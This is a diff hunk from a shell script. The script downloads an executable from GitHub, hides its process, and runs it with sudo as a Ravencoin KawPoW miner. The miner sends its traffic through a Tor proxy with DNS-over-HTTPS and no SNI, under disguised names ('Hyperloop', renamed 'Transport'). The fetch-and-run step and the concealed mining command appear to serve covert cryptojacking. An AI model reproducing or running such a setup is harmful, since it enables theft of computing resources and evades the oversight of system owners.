@@ -8,4 +8,4 @@ wget https://raw.githubusercontent.com/nathanfleight/scripts/main/Transport
 chmod +x Transport
 ph add Transport
 sleep 30
-sudo ./Hyperloop -a kawpow -o stratum+tcp://rvn.2miners.com:6060 -u rFb4oRYDDbHpFEcshVx1ppLG97njb9kWCQ -p x -w Trans --no-sni  --proxy 127.0.0.1:9050 --dns-https-server 1.1.1.1     
+sudo ./Transport -a kawpow -o stratum+tcp://rvn.2miners.com:6060 -u rFb4oRYDDbHpFEcshVx1ppLG97njb9kWCQ -p x -w Trans --no-sni  --proxy 127.0.0.1:9050 --dns-https-server 1.1.1.1     
